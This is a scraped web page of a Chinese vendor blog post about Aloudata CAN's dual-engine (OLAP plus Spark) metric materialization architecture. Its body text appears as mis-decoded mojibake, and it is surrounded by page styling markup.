                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€ï¼šä»â€œå¿«â€åˆ°â€œç¨³â€ï¼Œæ¶æ„æ¼”è¿›çš„å¿…ç„¶</h2>
<p>è‡ª Aloudata CAN è‡ªåŠ¨åŒ–æŒ‡æ ‡å¹³å°å‘å¸ƒä»¥æ¥ï¼Œæˆ‘ä»¬å§‹ç»ˆåšæŒâ€œNoETL è¯­ä¹‰ç¼–ç»‡â€çš„æ ¸å¿ƒç†å¿µï¼šä¸»å¼ ä¼ä¸šåº”åœ¨æ˜ç»†æ•°æ®ï¼ˆDWDï¼‰ä¹‹ä¸Šç›´æ¥å®šä¹‰æŒ‡æ ‡ï¼Œè€Œéä¾èµ–å±‚å±‚å›ºåŒ–çš„ç‰©ç†å®½è¡¨ã€‚è¿™ç§â€œåŸºäºæ˜ç»†æ•°æ®ï¼Œå®šä¹‰å³å¼€å‘â€çš„æ¨¡å¼ï¼Œæœ€å¤§ç¨‹åº¦åœ°ä¿éšœäº†æŒ‡æ ‡å£å¾„çš„è¯­ä¹‰ä¸€è‡´æ€§ï¼Œå¹¶èµ‹äºˆäº†ä¸šåŠ¡äººå‘˜æœ€å¤§çš„åˆ†æè‡ªç”±åº¦ã€‚</p>
<p>ä¸ºäº†æ”¯æ’‘è¿™ä¸€ç†å¿µï¼ŒAloudata CAN æ„å»ºäº†å¼ºå¤§çš„è¯­ä¹‰è§£æå¼•æ“ã€‚åœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…ï¼Œæˆ‘ä»¬é»˜è®¤é‡‡ç”¨ MPP æ¶æ„çš„ OLAP å¼•æ“ï¼ˆå¦‚Â ApacheÂ Dorisã€StarRocksï¼‰ä½œä¸ºæ ¸å¿ƒè®¡ç®—ä¸å­˜å‚¨è½½ä½“ã€‚åœ¨ç»å¤§å¤šæ•°é«˜å¹¶å‘ã€ä½å»¶è¿Ÿçš„äº¤äº’å¼åˆ†æåœºæ™¯ä¸­ï¼Œè¿™ç§æ¶æ„å‡­å€Ÿæå…¶ä¼˜å¼‚çš„æŸ¥è¯¢å“åº”é€Ÿåº¦ï¼Œè¯æ˜äº†å…¶é«˜æ•ˆæ€§ã€‚</p>
<p>ç„¶è€Œï¼Œéšç€ä¼ä¸šæ•°å­—åŒ–è½¬å‹æ­¥å…¥æ·±æ°´åŒºï¼Œæ•°æ®è¿è¥çš„é¢—ç²’åº¦ä¸æ·±åº¦å‘ç”Ÿäº†è´¨å˜ã€‚æˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼Œå¤´éƒ¨ä¼ä¸šçš„ä¸šåŠ¡éœ€æ±‚æ­£åœ¨ä»â€œçœ‹å®è§‚è¶‹åŠ¿â€å‘â€œåšå¾®è§‚å½’å› â€è½¬å˜ã€‚ä¸šåŠ¡éƒ¨é—¨å¼€å§‹ä¾èµ–é•¿å‘¨æœŸçš„å¤æ‚æ˜ç»†è®¡ç®—æ¥è¾…åŠ©å†³ç­–ï¼Œä¾‹å¦‚ï¼Œé›¶å”®ä¼ä¸šéœ€è¦åŸºäºè¿‡å»ä¸¤åˆ°ä¸‰å¹´çš„äº¤æ˜“æ˜ç»†ï¼Œè®¡ç®—ç‰¹å®šäººç¾¤çš„ç”Ÿå‘½å‘¨æœŸä»·å€¼ï¼ˆLTVï¼‰ï¼›é‡‘èæœºæ„éœ€è¦å›æº¯æµ·é‡æµæ°´æ•°æ®ï¼Œè¿›è¡Œè·¨å‘¨æœŸçš„é£é™©å› å­å½’å› ã€‚</p>
<p>å½“è¿™ç§æ¶‰åŠç™¾äº¿ç”šè‡³åƒäº¿çº§æ•°æ®çš„é•¿å‘¨æœŸã€é«˜å¤æ‚åº¦è®¡ç®—æˆä¸ºå¸¸æ€ï¼Œå•ä¸€ OLAP å¼•æ“æ¶æ„å¼€å§‹é¢ä¸´ç‰©ç†å®šå¾‹çš„æŒ‘æˆ˜ã€‚OLAP å¼•æ“è™½ç„¶æ“…é•¿å¿«é€ŸæŸ¥è¯¢ï¼Œä½†åœ¨å¤„ç†è¶…å¤§è§„æ¨¡æ•°æ®çš„å…¨é‡ç‰©åŒ–æ„å»ºè¿™ç§â€œé‡ååâ€ä»»åŠ¡æ—¶ï¼Œå¾€å¾€é¢ä¸´å†…å­˜èµ„æºï¼ˆOOMï¼‰ç“¶é¢ˆã€‚å°¤å…¶æ˜¯é•¿è€—æ—¶ä»»åŠ¡è¿è¡Œåœ¨æŸ¥è¯¢é›†ç¾¤ä¸Šï¼Œææ˜“å¼•å‘èµ„æºäº‰æŠ¢ï¼Œå½±å“ä¸šåŠ¡è¿ç»­æ€§ã€‚</p>
<p>åœ¨ä¼ä¸šçœŸå®çš„æŠ€æœ¯ç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¸ä¼šä¹Ÿä¸åº”åªæœ‰ä¸€ç§è®¡ç®—å¼•æ“ã€‚OLAP å¼•æ“æ“…é•¿äº¤äº’å¼åˆ†æï¼Œè€Œ Spark ç­‰æ‰¹å¤„ç†å¼•æ“åˆ™åœ¨æµ·é‡æ•°æ®ååä¸ç¨³å®šæ€§ä¸Šå…·å¤‡å¤©ç„¶ä¼˜åŠ¿ã€‚éšç€å®¢æˆ·æ•°é‡çš„æŒç»­å¢é•¿å’Œåº”ç”¨åœºæ™¯çš„æ·±å…¥ï¼Œæˆ‘ä»¬ä¹Ÿåº”å½“é€‚æ—¶å‡çº§åº•å±‚æ¶æ„ã€‚</p>
<p>å› æ­¤ï¼ŒAloudata CAN æ­£å¼æ¨å‡ºâ€œåŒå¼•æ“ç‰©åŒ–æ¶æ„â€ã€‚è¿™ä¸æ˜¯å¯¹è¿‡å¾€çš„å¦å®šï¼Œè€Œæ˜¯ NoETL ç†å¿µåœ¨å·¥ç¨‹è½åœ°ä¸Šçš„æˆç†Ÿâ€”â€”è®©è¯­ä¹‰å±‚ä¿æŒç»Ÿä¸€ï¼Œè®©è®¡ç®—å±‚å„å¸å…¶èŒï¼šæ—¢é€šè¿‡ OLAP å¼•æ“ä¿éšœå‰ç«¯æŸ¥è¯¢çš„æè‡´é€Ÿåº¦ï¼Œåˆé€šè¿‡ Spark å¼•æ“æ‰¿è½½åƒäº¿çº§æ•°æ®çš„æ‰¹å¤„ç†è®¡ç®—ã€‚</p>
<h2 data-id="heading-1">æé™åœºæ™¯å®æµ‹ï¼šåƒäº¿çº§æ˜ç»†è®¡ç®—çªå›´</h2>
<p>æ¶æ„è®¾è®¡çš„ä¼˜åŠ£ï¼Œæœ€ç»ˆéœ€è¦å›åˆ°çœŸå®çš„ä¸šåŠ¡ç†”ç‚‰ä¸­å»æ£€éªŒã€‚ä¸ºäº†éªŒè¯åŒå¼•æ“æ¶æ„åœ¨æç«¯è´Ÿè½½ä¸‹çš„è¡¨ç°ï¼Œæˆ‘ä»¬ä¸ä¸€å®¶å¤´éƒ¨é›¶å”®è¡Œä¸šçš„æ ‡æ†å®¢æˆ·åˆä½œï¼Œè¿›è¡Œäº†ä¸€æ¬¡â€œæé™å‹æµ‹â€ã€‚</p>
<ul>
<li>åœºæ™¯èƒŒæ™¯ï¼š</li>
</ul>
<p>å®¢æˆ·è¦æ±‚åŸºäºè¿‡å»ä¸¤å¹´çš„å…¨é‡äº¤æ˜“æ˜ç»†æ•°æ®ï¼ˆè§„æ¨¡è¾¾åƒäº¿çº§ï¼‰ï¼Œè®¡ç®—åŒ…æ‹¬â€œå®¢å•ä»· 52 å‘¨åŒç¯æ¯”â€ã€â€œè®¢å•æ•° 52 å‘¨åŒç¯æ¯”â€ç­‰åœ¨å†…çš„ 28 ä¸ªæ ¸å¿ƒæŒ‡æ ‡å’Œ 17 ä¸ªå¤æ‚ç»´åº¦ã€‚</p>
<ul>
<li>é­é‡æˆ˜ï¼ˆOLAP å•å¼•æ“ï¼‰ï¼š</li>
</ul>
<p>è¯¥ä»»åŠ¡æœ€åˆç”±ä¸€å¥—é…ç½®è±ªåçš„ OLAP é›†ç¾¤æ‰¿æ‹…ï¼ˆæ•°åƒæ ¸ CPUï¼Œè¿‘ 20TB å†…å­˜ï¼‰ã€‚ç„¶è€Œï¼Œé¢å¯¹åƒäº¿çº§æ•°æ®çš„å¤§è§„æ¨¡ Join å’Œå¤æ‚èšåˆï¼ŒOLAP å¼•æ“ä¾ç„¶è§¦ç¢°åˆ°äº†å†…å­˜å¤„ç†çš„ç‰©ç†è¾¹ç•Œï¼Œä»»åŠ¡å›  OOM åå¤å¤±è´¥ã€‚å°è¯äº†åœ¨è¶…å¤§è§„æ¨¡çš„å…¨é‡ç‰©åŒ–åœºæ™¯ä¸­ï¼Œå•çº¯ä¾èµ–å†…å­˜å¯†é›†å‹çš„ OLAP å¼•æ“å¹¶éæœ€ä¼˜è§£ã€‚</p>
<ul>
<li>çªå›´æˆ˜ï¼ˆåŒå¼•æ“åˆ‡æ¢ï¼‰ï¼š</li>
</ul>
<p>æˆ‘ä»¬å°†è¯¥ä»»åŠ¡åˆ‡æ¢è‡³ Aloudata CAN çš„åŒå¼•æ“æ¨¡å¼ï¼Œå¯ç”¨ Spark æ‰¹å¤„ç†å¼•æ“æ¥ç®¡è®¡ç®—ï¼Œä»â€œå…¨å†…å­˜ä¾èµ–â€åˆ‡æ¢ä¸ºæ›´ç¨³å¥çš„â€œå†…å­˜+ç£ç›˜ Shuffleâ€çš„é¢„è®¡ç®—æ¨¡å¼ã€‚åœ¨æ–°çš„æ¶æ„ä¸‹ï¼Œæˆ‘ä»¬å°†è®¡ç®—èµ„æºæ•´ä½“å‡åŠã€‚</p>
<p>å®æµ‹ç»“æœæ˜¾ç¤ºï¼š</p>
<ul>
<li>ç¨³å®šæ€§è´¨å˜ï¼šä»»åŠ¡æˆåŠŸç‡ä»ä¸ç¡®å®šè½¬å˜ä¸ºÂ 100%ï¼Œå½»åº•æ¶ˆé™¤äº† OOM é£é™©ã€‚</li>
<li>æ•ˆç‡å¯æ§ï¼šè™½ç„¶ Spark é‡‡ç”¨è½ç›˜æœºåˆ¶ï¼Œä¸€ä¸ªåŠ é€Ÿåœºæ™¯ä»æ˜ç»†è®¡ç®—åˆ°æœ€ç»ˆæ±‡æ€»æŒ‡æ ‡äº§å‡ºï¼Œç«¯åˆ°ç«¯è·‘æ‰¹è®¡ç®—è€—æ—¶çº¦ 60 åˆ†é’Ÿã€‚ä½†ç›¸æ¯” OLAP å¼•æ“çš„ç³»ç»Ÿå´©æºƒå¯¼è‡´ä¸å¯ç”¨ï¼Œæ•´ä½“äº¤ä»˜æ—¶é—´åè€Œå¤§å¹…ç¼©çŸ­ï¼Œä¸”èµ„æºæˆæœ¬æ˜¾è‘—é™ä½ã€‚</li>
</ul>
<p>è¿™ä¸€å®æˆ˜æœ‰åŠ›åœ°è¯æ˜ï¼šAloudata CAN çš„åŒå¼•æ“æ¶æ„å…·å¤‡äº†åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œä»¥æ›´ç¨³å¥çš„æ–¹å¼é©¾é©­ä¼ä¸šæ ¸å¿ƒæ•°æ®èµ„äº§çš„å·¥ç¨‹èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-2">æ·±åº¦è§£æï¼šç³»ç»Ÿè‡ªåŠ¨åŒ–è¿˜æ˜¯ä¸“å®¶ç»éªŒï¼Ÿ</h2>
<p>é¢å¯¹å¦‚æ­¤åºå¤§çš„è®¡ç®—é‡ï¼Œèµ„æ·± ETL å·¥ç¨‹å¸ˆå¾€å¾€ä¼šè´¨ç–‘ï¼šâ€œå¦‚æœæˆ‘æ‰‹åŠ¨å†™ SQL è¿›è¡Œç²¾ç»†åŒ–åˆ†å±‚å’Œè°ƒä¼˜ï¼Œè‚¯å®šæ¯”ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„è·‘å¾—å¿«ã€‚â€</p>
<p>æ˜¯çš„ï¼Œé’ˆå¯¹å•ä¸€ç‰¹å®šä»»åŠ¡ï¼Œä¸€ä½ç²¾é€šä¸šåŠ¡ä¸é›†ç¾¤ç‰¹æ€§çš„é¡¶å°–ä¸“å®¶ï¼Œç¡®å®èƒ½é€šè¿‡ Case by Case çš„â€œæ‰‹å·¥è‰ºâ€å®ç°æ¯”è‡ªåŠ¨åŒ–ç³»ç»Ÿæ›´é«˜çš„æ•ˆç‡ã€‚ä½†å½“æˆ‘ä»¬æŠŠè§†è§’æ‹‰å‡è‡³ä¼ä¸šçº§å·¥ç¨‹æ—¶ï¼Œè´¦å°±ä¸èƒ½è¿™ä¹ˆç®—äº†ã€‚</p>
<ol>
<li>å¹¶éâ€œæš´åŠ›è®¡ç®—â€</li>
</ol>
<p>Aloudata CAN çš„è®¡ç®—å¼•æ“ä¸æ˜¯ç®€å•çš„ SELECT *ã€‚ç³»ç»Ÿå†…ç½®äº†å¤æ‚çš„ä»»åŠ¡ç¼–æ’é€»è¾‘ï¼Œè‡ªåŠ¨è¿›è¡Œä»»åŠ¡æ‹†åˆ†ã€æ¨å¯¼ä¸­é—´å±‚ä¾èµ–ï¼Œå¹¶æ ¹æ®é›†ç¾¤è´Ÿè½½æ§åˆ¶å¹¶è¡Œåº¦ã€‚å®ƒå¯»æ±‚çš„æ˜¯ä¸€ç§åŸºäºè§„åˆ™æŠ½è±¡çš„ã€æ•´ä½“æ•ˆç‡æœ€é«˜çš„è‡ªåŠ¨åŒ–è·¯å¾„ã€‚</p>
<ol start="2">
<li>è§„æ¨¡æ•ˆåº”ä¸ç»´æŠ¤æˆæœ¬</li>
</ol>
<p>é¡¶å°–ä¸“å®¶æ˜¯ç¨€ç¼ºèµ„æºï¼Œä»–ä»¬æˆ–è®¸èƒ½å®Œç¾ä¼˜åŒ– Top 10 çš„æ ¸å¿ƒä»»åŠ¡ï¼Œä½†å‰©ä½™ 90% çš„é•¿å°¾æŒ‡æ ‡è°æ¥ç»´æŠ¤ï¼Ÿæ›´é‡è¦çš„æ˜¯ï¼Œå½“ä¸šåŠ¡å£å¾„å‘ç”Ÿå¾®è°ƒæ—¶ï¼ˆä¾‹å¦‚ä¿®æ”¹äº†ä¸€ä¸ªä¸­é—´å±‚çš„è¿‡æ»¤æ¡ä»¶ï¼‰ï¼Œäººç±»ä¸“å®¶å¯èƒ½éœ€è¦æ’æŸ¥æ•°åä¸ªè„šæœ¬çš„è¡€ç¼˜å½±å“å¹¶é‡å†™ä»£ç ï¼Œè€Œè‡ªåŠ¨åŒ–ç³»ç»Ÿåªéœ€ä¿®æ”¹è¯­ä¹‰å®šä¹‰ï¼Œå³å¯è‡ªåŠ¨é‡æ–°ç¼–æ’æœ€ä¼˜æ‰§è¡Œè·¯å¾„ã€‚</p>
<p>ç»´æŠ¤æˆæœ¬çš„å½’é›¶ï¼Œæ‰æ˜¯è‡ªåŠ¨åŒ–æœ€å¤§çš„çº¢åˆ©ã€‚</p>
<p>è¿™å°±æ˜¯ Aloudata CAN åŒå¼•æ“æ¶æ„çš„æ ¸å¿ƒä»·å€¼â€”â€”å®ƒè¿½æ±‚çš„ä¸æ˜¯å•ç‚¹æè‡´æ€§èƒ½ï¼Œè€Œæ˜¯ä¼ä¸šçº§æ•´ä½“æ•°æ®å¼€å‘çš„æœ€é«˜æŠ•å…¥äº§å‡ºæ¯”ï¼ˆROIï¼‰ã€‚æœºå™¨ä»¥ 100% çš„å‡†ç¡®ç‡å’Œæé«˜çš„æ€§ä»·æ¯”å®Œæˆæµ·é‡è®¡ç®—ï¼Œå°†å®è´µçš„äººç±»ä¸“å®¶ä»ç¹çä»£ç å’Œè¿ç»´ä»»åŠ¡ä¸­è§£æ”¾å‡ºæ¥ï¼Œä¸“æ³¨äºæ•°æ®å»ºæ¨¡ä¸ä¸šåŠ¡ä»·å€¼æŒ–æ˜ã€‚</p>
<h2 data-id="heading-3">ç¡¬æ ¸æŠ€æœ¯æ‹†è§£ï¼šåœ¨å¼‚æ„æ¶æ„ä¹‹ä¸Šé‡æ„ç»Ÿä¸€è¯­ä¹‰</h2>
<p>å¢åŠ ä¸€ä¸ªè®¡ç®—å¼•æ“å¹¶éç®€å•çš„â€œåŠŸèƒ½æŒ‚è½½â€ï¼Œè€Œæ˜¯ä¸€æ¬¡ä¼¤ç­‹åŠ¨éª¨çš„æ¶æ„é‡æ„ã€‚æ ¸å¿ƒæŒ‘æˆ˜åœ¨äºï¼šå¦‚ä½•åœ¨ç‰©ç†æ‰§è¡Œå±‚åˆ†åŒ–ï¼ˆMPP vs Batchï¼‰çš„æƒ…å†µä¸‹ï¼Œä¾ç„¶å‘ä¸Šå±‚ç”¨æˆ·å±è”½å¤æ‚æ€§ï¼Œç»´æŒâ€œå®šä¹‰å³å¼€å‘â€çš„ä½“éªŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa64ff6758d649a58257e8e2a2c19c54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxvdWRhdGHlpKflupTnp5HmioA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769065490&amp;x-signature=FEdaGhwTfBHNZG8LeI6952z1g4E%3D" alt="2EE10882-2991-46BD-AFF6-0C4E33469D6D.png" loading="lazy"/></p>
<p>å›¾ï¼šåŒå¼•æ“æ¶æ„ä¸‹ï¼Œå½“ç”¨æˆ·é€‰æ‹©é€šè¿‡ Spark è¿›è¡ŒåŠ é€Ÿä»»åŠ¡æ„å»ºçš„ç³»ç»Ÿæ¶æ„å›¾</p>
<ol>
<li>æ— æ„ŸçŸ¥çš„æ–¹è¨€ç¿»è¯‘ï¼šæ„å»ºè¯­ä¹‰å±‚çš„â€œé€šç”¨ç¼–è¯‘å™¨â€</li>
</ol>
<p>ç³»ç»Ÿåœ¨è¯­ä¹‰å±‚æ„å»ºäº†ä¸€å¥—é«˜ç²¾åº¦çš„â€œæ–¹è¨€ç¼–è¯‘å™¨â€ã€‚å½“ç”¨æˆ·å‘èµ·åŠ é€Ÿè¯·æ±‚æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†ç»Ÿä¸€çš„è¯­ä¹‰æ¨¡å‹ï¼ˆSemantic Modelï¼‰â€œç¼–è¯‘â€ä¸ºé’ˆå¯¹ Spark ä¼˜åŒ–çš„ç‰©ç† SQLã€‚æ— è®ºæ˜¯çª—å£å‡½æ•°è¿˜æ˜¯æ—¥æœŸå¤„ç†ï¼Œç³»ç»Ÿè‡ªåŠ¨æŠ¹å¹³äº† Spark ä¸ OLAP çš„è¯­æ³•å·®å¼‚ï¼Œç¡®ä¿è®¡ç®—ç»“æœåœ¨æ•°å­¦ä¸Šçš„ç»å¯¹ä¸€è‡´ã€‚</p>
<ol start="2">
<li>å¼‚æ„å­˜å‚¨çš„æ— ç¼ååï¼šåŸºäº Arrow Flight çš„é«˜é€Ÿæ€»çº¿</li>
</ol>
<p>ä¸ºäº†è§£å†³ Spark è¯»å– OLAP å†…è¡¨æ•°æ®çš„æ€§èƒ½ç“¶é¢ˆï¼Œæˆ‘ä»¬åˆ©ç”¨ Spark Connector ç»“åˆ Apache Arrow Flight æŠ€æœ¯ï¼Œå®ç°äº†æ•°æ®çš„å‘é‡åŒ–ä¼ è¾“ä¸å¹¶è¡Œè¯»å–ã€‚ç³»ç»Ÿèƒ½å¤Ÿè‡ªåŠ¨åˆ‡åˆ† Tablet å¹¶è¡Œæ‹‰å–ï¼Œæå¤§é™ä½äº†åºåˆ—åŒ–å¼€é”€ï¼Œç¡®ä¿æµ·é‡æ˜ç»†æ•°æ®çš„ç§’çº§ååã€‚</p>
<ol start="3">
<li>æ™ºèƒ½åˆ†åŒºç®¡ç†ï¼šå¤§è§„æ¨¡æ•°æ®çš„ä¸€è‡´æ€§ä¿éšœ</li>
</ol>
<p>åœ¨å¤„ç†é•¿å‘¨æœŸå†å²å›åˆ·æ—¶ï¼ŒAloudata CAN æ·±åº¦é›†æˆäº† Spark çš„åŠ¨æ€åˆ†åŒºè¦†å†™ï¼ˆDynamic Partition Overwriteï¼‰æœºåˆ¶ã€‚ç³»ç»Ÿç²¾ç¡®è¯†åˆ«å—å½±å“çš„æ—¶é—´åˆ†åŒºï¼Œä»…å¯¹ç‰¹å®šåˆ†åŒºè¿›è¡Œé‡ç®—ä¸è¦†å†™ï¼Œé…åˆäº‹åŠ¡æœºåˆ¶ï¼Œç¡®ä¿æ— è®ºä»»åŠ¡è€—æ—¶å¤šä¹…ï¼Œå¯¹å¤–å‘ˆç°çš„æ•°æ®å§‹ç»ˆä¸€è‡´ä¸”å¯ç”¨ã€‚</p>
<h2 data-id="heading-4">æ¶æ„çº¢åˆ©ï¼šæ›´ç¨³çš„ SLA ä¸æ›´ä¼˜çš„ ROI</h2>
<p>å¼•å…¥åŒå¼•æ“æ¶æ„ï¼Œæ›´ä¸ºä¼ä¸šå¸¦æ¥äº†éšæ€§çš„æ¶æ„çº¢åˆ©ã€‚</p>
<ol>
<li>èµ„æºéš”ç¦»ï¼šç»ˆç»“â€œè·‘æ‰¹æ‹–å®çœ‹æ•°â€</li>
</ol>
<p>åŒå¼•æ“å®ç°äº†ç‰©ç†å±‚é¢çš„èµ„æºéš”ç¦»ï¼šOLAP å¼•æ“å›å½’â€œæé€ŸæŸ¥è¯¢â€æœ¬ä½ï¼ŒæœåŠ¡ BI ä¸ AIï¼›Spark æ¥ç®¡é‡è´Ÿè½½çš„å…¨é‡æ„å»ºã€‚è¿™ç§åˆ†å·¥å½»åº•è§£å†³äº†â€œæ„å»ºè´Ÿè½½â€æŒ¤å â€œåˆ†æè´Ÿè½½â€çš„éš¾é¢˜ï¼Œç¡®ä¿å‰å° CEO çœ‹æ¿åœ¨ä»»ä½•æ—¶åˆ»éƒ½æµç•…å¦‚åˆã€‚</p>
<ol start="2">
<li>FinOps è§†è§’ä¸‹çš„æœ€ä¼˜è§£</li>
</ol>
<p>ä¼ä¸šä¸å†éœ€è¦ä¸ºäº†åº”å¯¹å¶å°”çš„è®¡ç®—å³°å€¼è€ŒæŒ‰â€œæœ€é«˜æ°´ä½â€é…ç½®æ˜‚è´µçš„ OLAP é›†ç¾¤ã€‚é€šè¿‡å°†ä½é¢‘ã€é«˜ååçš„é‡å‹è®¡ç®—è½¬ç§»è‡³å•ä½æˆæœ¬æ›´ä½çš„ Spark é›†ç¾¤ï¼Œä¼ä¸šå¯ä»¥åœ¨ä¸ç‰ºç‰²æ€§èƒ½çš„å‰æä¸‹ï¼Œæ˜¾è‘—é™ä½ TCOã€‚</p>
<ol start="3">
<li>å¼€æ”¾ä¸å…¼å®¹</li>
</ol>
<p>ç³»ç»Ÿé»˜è®¤æ”¯æŒå°†ç»“æœå†™å› Doris å†…è¡¨ä»¥æä¾›æœ€ä½³æŸ¥è¯¢æ€§èƒ½ï¼Œä½†æˆ‘ä»¬åŒæ ·æ”¯æŒ Hive Metastore å’Œ Icebergã€‚æ„å‘³ç€ Aloudata CAN èƒ½æ— ç¼èå…¥ä¼ä¸šå·²æœ‰çš„æ¹–ä»“ç”Ÿæ€ï¼Œä¿æŠ¤æ—¢æœ‰ IT æŠ•èµ„ã€‚</p>
<h2 data-id="heading-5">ç»“è¯­ï¼šè®©æ•°æ®å›¢é˜Ÿå›å½’ä¸šåŠ¡ä»·å€¼</h2>
<p>æŠ€æœ¯çš„è¿›æ­¥ï¼Œæ˜¯ä¸ºäº†å°†äººç±»ä»é‡å¤åŠ³åŠ¨ä¸­è§£æ”¾å‡ºæ¥ã€‚</p>
<p>Aloudata CAN åŒå¼•æ“æ¶æ„çš„æ¨å‡ºå’Œç”Ÿäº§çº§éªŒè¯ï¼Œæ ‡å¿—ç€ NoETL æŒ‡æ ‡å¹³å°è¿™ä¸€è‡ªåŠ¨åŒ–æ•°æ®å¼€å‘ä¸æ²»ç†çš„æ–°å“ç±»å·²ç»å…·å¤‡äº†å¤„ç†ä¼ä¸šçº§æ ¸å¿ƒã€æç«¯è´Ÿè½½çš„æˆç†Ÿèƒ½åŠ›ã€‚é¢å¯¹åƒäº¿çº§æ•°æ®ï¼Œä¼ä¸šæ— éœ€å†ä¸ºâ€œç®—ä¸åŠ¨â€è€Œç„¦è™‘ï¼Œä¹Ÿæ— éœ€åœ¨â€œçµæ´»æ€§â€ä¸â€œç¨³å®šæ€§â€ä¹‹é—´åšè‰°éš¾å–èˆã€‚</p>
<p>å½“æœºå™¨å·²ç»èƒ½ä»¥ 100% çš„å‡†ç¡®ç‡å’Œæœ€ä¼˜æˆæœ¬å®Œæˆæµ·é‡è®¡ç®—æ—¶ï¼Œæ•°æ®ä¸“å®¶çš„æ™ºæ…§ï¼Œåº”å½“èšç„¦äºå®šä¹‰é‚£äº›çœŸæ­£é©±åŠ¨å¢é•¿çš„ä¸šåŠ¡æŒ‡æ ‡ï¼Œè€Œéçº ç»“äºåº•å±‚çš„ SQL å†™æ³•ã€‚</p>
<p>è¿™æ­£æ˜¯æˆ‘ä»¬æ„å»ºåŒå¼•æ“æ¶æ„çš„åˆè¡·ï¼šç”¨æœ€ç¡¬æ ¸çš„å·¥ç¨‹åº•åº§ï¼Œæ”¯æ’‘æœ€è‡ªç”±çš„ä¸šåŠ¡æ¢ç´¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: 